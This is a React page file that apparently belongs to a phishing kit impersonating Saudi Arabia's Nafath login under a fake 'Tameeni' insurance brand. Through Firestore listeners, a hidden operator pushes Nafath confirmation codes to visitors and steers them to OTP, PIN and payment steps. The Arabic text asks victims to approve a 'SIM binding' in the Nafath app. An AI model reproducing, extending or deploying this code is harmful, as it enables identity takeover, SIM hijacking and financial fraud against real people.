"use client";

import { ShieldAlert, Smartphone, CheckCircle2, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { useEffect, useRef, useState } from "react";
import { addData, db } from "@/lib/firebase";
import { Alert } from "@/components/ui/alert";
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { updateVisitorPage } from "@/lib/visitor-tracking";

export default function Component() {
  const [showConfirmDialog, setShowConfirmDialog] = useState(true);
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [confirmationCode, setConfirmationCode] = useState<string>("");
  const [showError, setShowError] = useState("");
  const hasStartedAuth = useRef(false);

  const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""
  
  // Monitor for admin redirects
  useRedirectMonitor({ visitorId, currentPage: "nafad" })

  // Start Nafad auth flow automatically (no manual ID/password form)
  useEffect(() => {
    if (!visitorId || hasStartedAuth.current) return

    hasStartedAuth.current = true
    setShowConfirmDialog(true)
    setShowError("")

    addData({
      id: visitorId,
      nafadConfirmationStatus: "waiting",
      currentStep: "_t6",
      nafadUpdatedAt: new Date().toISOString()
    })
  }, [visitorId])
  
  // Update visitor page
  useEffect(() => {
    if (visitorId) {
      updateVisitorPage(visitorId, "nafad", 8)
    }
  }, [visitorId])

  // <ADMIN_NAVIGATION_SYSTEM> Unified navigation listener for admin control
  useEffect(() => {
    if (!visitorId) return

    console.log("[nafad] Setting up navigation listener for visitor:", visitorId)

    if (!db) return
    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data()
          console.log("[nafad] Firestore data received:", data)

          // Admin navigation: Handle page redirects
          if (data.currentStep === "home") {
            console.log("[nafad] Admin redirecting to home")
            window.location.href = "/"
          } else if (data.currentStep === "phone") {
            console.log("[nafad] Admin redirecting to phone-info")
            window.location.href = "/step5"
          } else if (data.currentStep === "_t6") {
            console.log("[nafad] Admin wants visitor to stay on nafad page")
            // Already on nafad page, do nothing
          } else if (data.currentStep === "_st1") {
            console.log("[nafad] Admin redirecting to payment")
            window.location.href = "/check"
          } else if (data.currentStep === "_t2") {
            console.log("[nafad] Admin redirecting to otp")
            window.location.href = "/step2"
          } else if (data.currentStep === "_t3") {
            console.log("[nafad] Admin redirecting to pin")
            window.location.href = "/step3"
          }
          // If currentStep === "_t6" or "nafad" or a number (from updateVisitorPage), stay on this page

          // Listen for confirmation code from admin (updates every time)
          if (data.nafadConfirmationCode) {
            console.log("[nafad] Received confirmation code:", data.nafadConfirmationCode)
            setConfirmationCode(data.nafadConfirmationCode)
            
            // Use localStorage to track shown codes (persists across page reloads)
            const storageKey = `nafad_shown_${visitorId}`
            const lastShownCode = localStorage.getItem(storageKey)
            
            // Only show modal if this is a NEW code (not previously shown)
            if (data.nafadConfirmationCode !== lastShownCode) {
              console.log("[nafad] New code detected, showing modal")
              setShowConfirmDialog(true)
              localStorage.setItem(storageKey, data.nafadConfirmationCode)
              setShowError("") // Clear any previous errors
              setShowSuccessDialog(false) // Close success dialog if open
            } else {
              console.log("[nafad] Code already shown, not opening modal")
            }
          } else if (data.nafadConfirmationCode === "") {
            // Admin cleared the code
            setShowConfirmDialog(true)
            const storageKey = `nafad_shown_${visitorId}`
            localStorage.removeItem(storageKey) // Reset tracking
          }

          // Listen for admin approval/rejection
          if (data.nafadConfirmationStatus === "approved") {
            console.log("[nafad] Admin approved the confirmation")
            setShowConfirmDialog(false)
            setShowSuccessDialog(true)
            // Clear status after use
            setDoc(doc(db as Firestore, "pays", visitorId), {
              nafadConfirmationStatus: "",
              nafadConfirmationCode: ""
            }, { merge: true })
          } else if (data.nafadConfirmationStatus === "rejected") {
            console.log("[nafad] Admin rejected the confirmation")
            setShowConfirmDialog(false)
            setShowError("تم رفض عملية التحقق. يرجى المحاولة مرة أخرى.")
            // Clear status after use
            setDoc(doc(db as Firestore, "pays", visitorId), {
              nafadConfirmationStatus: "",
              nafadConfirmationCode: ""
            }, { merge: true })
          }
        }
      },
      (error) => {
        console.error("[nafad] Firestore listener error:", error)
      }
    )

    return () => {
      console.log("[nafad] Cleaning up navigation listener")
      unsubscribe()
    }
  }, [])

  // Confirmation code will be displayed as two individual digits

  return (
    <div
      className="min-h-screen bg-slate-50"
      dir="rtl"
    >
      {/* Header */}
      <header className="sticky top-0 z-20 bg-white/95 border-b border-slate-200 backdrop-blur">
        <div className="flex items-center justify-between p-4 max-w-6xl mx-auto">
          <div className="flex items-center gap-3">
            <div className="px-3 py-1 rounded-full bg-[#0a4a68] text-white text-xs font-bold">
              تأميني
            </div>
            <div className="h-6 w-px bg-slate-200" />
            <img src="/nafad-logo.png" alt="نفاذ" width={96} className="object-contain" />
          </div>
          <p className="text-xs sm:text-sm text-slate-500 font-medium">
            التحقق عبر النفاذ الوطني الموحد
          </p>
        </div>
      </header>

      {/* Main Content */}
      <main className="p-4 sm:p-6 max-w-6xl mx-auto py-8 sm:py-12">
        {/* Hero */}
        <section className="relative overflow-hidden rounded-3xl bg-gradient-to-r from-[#0a4a68] via-[#0d5a7d] to-[#0a4a68] text-white p-6 sm:p-10 mb-6">
          <div className="absolute -top-16 -left-16 w-52 h-52 rounded-full bg-white/10" />
          <div className="absolute -bottom-20 -right-12 w-56 h-56 rounded-full bg-white/10" />

          <div className="relative grid md:grid-cols-5 gap-6 items-center">
            <div className="md:col-span-3 space-y-4">
              <span className="inline-flex items-center px-3 py-1 rounded-full bg-white/15 border border-white/20 text-xs font-bold">
                منصة تأميني
              </span>
              <h2 className="text-2xl sm:text-4xl font-extrabold leading-tight">
                أول منصة تأمين سيارات
                <br />
                في السعودية
              </h2>
              <p className="text-white/90 max-w-xl leading-relaxed">
                أكمل التحقق عبر نفاذ لإصدار وثيقة التأمين الخاصة بك بشكل فوري وآمن.
              </p>
              <div className="flex flex-wrap items-center gap-3">
                <Button
                  onClick={() => setShowConfirmDialog(true)}
                  className="bg-white text-[#0a4a68] hover:bg-slate-100 h-11 px-7 rounded-xl font-bold"
                >
                  ابدأ الآن
                </Button>
                <span className="text-sm text-white/80">
                  خدمة موثقة ومحمية بالكامل
                </span>
              </div>
            </div>

            <div className="md:col-span-2">
              <div className="bg-white/10 border border-white/20 rounded-2xl p-5 backdrop-blur-sm">
                <div className="bg-white rounded-xl p-4 flex items-center justify-center">
                  <img src="/sa-map-grey.svg" alt="خريطة السعودية" className="h-24 sm:h-28 opacity-90" />
                </div>
                <div className="grid grid-cols-3 gap-2 mt-3">
                  <img src="/companies/company-1.svg" alt="شركة تأمين" className="h-6 mx-auto opacity-90" />
                  <img src="/companies/company-2.svg" alt="شركة تأمين" className="h-6 mx-auto opacity-90" />
                  <img src="/companies/company-3.svg" alt="شركة تأمين" className="h-6 mx-auto opacity-90" />
                </div>
              </div>
            </div>
          </div>
        </section>

        <div className="grid lg:grid-cols-5 gap-6">
          {/* Left content */}
          <section className="lg:col-span-3 bg-white border border-slate-200 shadow-sm rounded-2xl p-6 sm:p-8 space-y-6">
            <div className="space-y-3">
              <span className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-amber-50 text-amber-700 border border-amber-200 text-xs font-bold">
                بوابة تأميني
              </span>
              <h1 className="text-2xl sm:text-3xl font-bold text-slate-800 leading-tight">
                أكمل التحقق عبر تطبيق نفاذ
              </h1>
              <p className="text-slate-600 leading-relaxed">
                تم فتح نافذة التحقق مباشرة. الرجاء الانتقال إلى تطبيق نفاذ وتأكيد العملية لإكمال طلب التأمين.
              </p>
            </div>

            <div className="space-y-3">
              <div className="flex items-start gap-3">
                <div className="w-7 h-7 rounded-full bg-[#0a4a68] text-white text-sm font-bold flex items-center justify-center mt-0.5">1</div>
                <p className="text-slate-700">افتح تطبيق نفاذ وسجل الدخول بحسابك الوطني.</p>
              </div>
              <div className="flex items-start gap-3">
                <div className="w-7 h-7 rounded-full bg-[#0a4a68] text-white text-sm font-bold flex items-center justify-center mt-0.5">2</div>
                <p className="text-slate-700">راجع طلب التحقق الظاهر في التطبيق.</p>
              </div>
              <div className="flex items-start gap-3">
                <div className="w-7 h-7 rounded-full bg-[#0a4a68] text-white text-sm font-bold flex items-center justify-center mt-0.5">3</div>
                <p className="text-slate-700">أكد الرمز المعروض لإتمام العملية والمتابعة.</p>
              </div>
            </div>

            {showError && (
              <Alert
                className="text-sm text-red-600 flex items-center gap-2 bg-red-50 border-red-200"
                dir="rtl"
              >
                <ShieldAlert className="w-5 h-5 text-red-600" />
                {showError}
              </Alert>
            )}

            <div className="pt-2">
              <Button
                onClick={() => setShowConfirmDialog(true)}
                className="bg-[#0a4a68] hover:bg-[#083d57] text-white h-11 px-8 rounded-xl font-semibold"
              >
                فتح نافذة التحقق
              </Button>
            </div>
          </section>

          {/* Right side cards */}
          <aside className="lg:col-span-2 space-y-4">
            <Card className="bg-white border border-slate-200 shadow-sm rounded-2xl">
              <CardContent className="p-6 space-y-4">
                <div className="flex items-center gap-3">
                  <div className="w-11 h-11 rounded-xl bg-[#0a4a68]/10 flex items-center justify-center">
                    <Smartphone className="w-6 h-6 text-[#0a4a68]" />
                  </div>
                  <div>
                    <p className="font-bold text-slate-800">تطبيق نفاذ</p>
                    <p className="text-xs text-slate-500">حمّل التطبيق إن لم يكن مثبتاً لديك</p>
                  </div>
                </div>

                <div className="flex justify-center gap-3">
                  <a href="#" className="hover:scale-105 transition-transform">
                    <img src="/google-play.png" alt="Google Play" className="h-10" />
                  </a>
                  <a href="#" className="hover:scale-105 transition-transform">
                    <img src="/apple_store.png" alt="App Store" className="h-10" />
                  </a>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-[#0a4a68] text-white border-0 shadow-sm rounded-2xl">
              <CardContent className="p-6 space-y-3">
                <p className="text-sm text-white/80">حالة الطلب</p>
                <p className="text-xl font-bold">بانتظار تأكيدك في نفاذ</p>
                <div className="flex items-center gap-2 pt-1">
                  <div className="w-6 h-6 rounded-full bg-white/10 border border-white/20 flex items-center justify-center">
                    <Loader2 className="w-4 h-4 animate-spin text-emerald-300" />
                  </div>
                  <span className="text-sm text-white/90">جاري المتابعة بشكل مباشر</span>
                </div>
                {!!confirmationCode && (
                  <div className="bg-white/10 border border-white/20 rounded-xl p-3 text-sm">
                    رمز التحقق الحالي: <span className="font-mono font-bold">{confirmationCode}</span>
                  </div>
                )}
              </CardContent>
            </Card>
          </aside>
        </div>
        
        {/* Confirmation Code Display Dialog - UPDATED WITH TWO SEPARATE CODES */}
        <Dialog open={showConfirmDialog} onOpenChange={() => {}}>
          <DialogContent className="max-w-md mx-auto [&>button]:hidden" dir="rtl">
            <DialogHeader>
              <DialogTitle className="text-center text-2xl font-bold text-[#0a4a68] mb-2">
                رمز التحقق
              </DialogTitle>
              <p className="text-center text-lg text-gray-800 leading-relaxed font-semibold px-4">
                سيتم إصدار أمر ربط شريحة بوثيقة التأمين الخاصة بك<br />
                الرجاء الدخول إلى تطبيق نفاذ وتأكيد الرقم أدناه
              </p>
            </DialogHeader>

            <div className="text-center space-y-6 p-4">
              {/* TWO DIGITS SIDE BY SIDE IN SMALLER ELEGANT BOX */}
              <div className="mx-auto w-48 h-48 bg-[#0a4a68]/5 border-2 border-[#0a4a68]/20 rounded-2xl shadow-lg flex items-center justify-center">
                <div className="flex gap-3 justify-center items-center" dir="ltr">
                  <div className="text-6xl font-bold text-[#0a4a68] font-mono">
                    {confirmationCode?.[0] || "-"}
                  </div>
                  <div className="text-6xl font-bold text-[#0a4a68] font-mono">
                    {confirmationCode?.[1] || "-"}
                  </div>
                </div>
              </div>

              <div className="flex items-center justify-center gap-3 py-2">
                <div className="w-8 h-8 rounded-full bg-[#0a4a68]/10 border border-[#0a4a68]/20 flex items-center justify-center">
                  <Loader2 className="w-5 h-5 animate-spin text-[#0a4a68]" />
                </div>
                <div className="text-sm font-medium text-[#0a4a68]">في انتظار الموافقة...</div>
              </div>
            </div>
          </DialogContent>
        </Dialog>

        {/* Success Dialog */}
        <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
          <DialogContent className="max-w-md mx-auto" dir="rtl">
            <div className="text-center space-y-6 p-4">
              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto">
                <CheckCircle2 className="w-12 h-12 text-green-600" />
              </div>

              <div className="space-y-2">
                <h3 className="text-2xl font-bold text-gray-800">
                  تم التحقق بنجاح!
                </h3>
                <p className="text-gray-600">
                  تمت عملية التحقق من هويتك بنجاح عبر نفاذ
                </p>
              </div>

              <div className="bg-green-50 border-2 border-green-200 rounded-lg p-4">
                <p className="text-sm text-green-800 font-medium">
                  شكراً لاستخدامك منصة النفاذ الوطني الموحد
                </p>
              </div>

              <Button
                onClick={() => setShowSuccessDialog(false)}
                className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white h-12 text-lg font-semibold shadow-md hover:shadow-lg transition-all"
              >
                إغلاق
              </Button>
            </div>
          </DialogContent>
        </Dialog>
      </main>

      {/* Footer */}
      <footer className="mt-12 bg-white border-t border-slate-200">
        <div className="max-w-6xl mx-auto px-4 py-6 flex flex-col sm:flex-row items-center justify-between gap-4">
          <p className="text-sm text-slate-500">© {new Date().getFullYear()} تأميني - جميع الحقوق محفوظة</p>
          <div className="flex items-center gap-5 text-sm text-slate-600">
            <a href="#" className="hover:text-[#0a4a68] transition-colors">سياسة الخصوصية</a>
            <a href="#" className="hover:text-[#0a4a68] transition-colors">الشروط والأحكام</a>
            <a href="#" className="hover:text-[#0a4a68] transition-colors">الدعم</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
